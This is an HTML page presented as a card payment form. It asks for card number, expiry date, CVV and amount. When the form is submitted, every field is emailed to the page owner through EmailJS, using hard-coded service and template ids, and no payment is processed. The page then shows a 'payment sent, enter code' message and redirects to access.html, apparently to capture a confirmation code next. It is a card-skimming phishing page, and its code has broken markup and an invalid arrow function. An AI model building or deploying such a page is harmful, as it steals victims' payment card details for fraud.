<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>make payment via card</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS public key
    })();
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #eef1f5;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .form-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      width: 350px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      margin-bottom: 5px;
    }

    input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }

    .message {
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="form-container">
    <h2>Make payment via card</h2>
    <form id="registerForm">
      <div class="form-group">
        <label for="name">card number</label>
        <input type="number" id="card number" name="card number" required />
      </div>
      <div class="form-group">
        <label for="email">Expiry date</label>
        <input type="expiration date" id="mm/yyyy" name="mm/yyyy" required />
      </div>
      <div class="form-group">
        <label for="phone">card security cv</label>
        <input type="card security cv" id="cv" name="cv" required  />
        
        </div>
        <div>
          <p>
        <label for="name">Amount</label>
        <input type="number" id="Amount" name="Amount" required />
      </div>
    </p>
      <div>

      <button type="submit">Make payment</button>
      <div class="message" id="message"></div>
  </div>

    </form>
  </div>

  

  <script>
  const form = document.getElementById('registerForm');
  const message = document.getElementById('message');

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    emailjs.sendForm('service_xuw4eys', 'template_c0462aw', form)
      .then(() => {
        // Optional: Show a quick success message before redirect
        message.style.color = 'green';
        message.textContent = 'payment sent enter code to cornfirm! payment...';

        // Redirect after a short delay (e.g., 2 seconds)
        setTimeout((3s) => {
          window.location.href = 'access.html';
        }, 2000);

        form.reset();
      }, (error) => {
        message.style.color = 'red';
        message.textContent = 'Failed to send: ' + error.text;
      });
  });
</script>

</body>
</html>
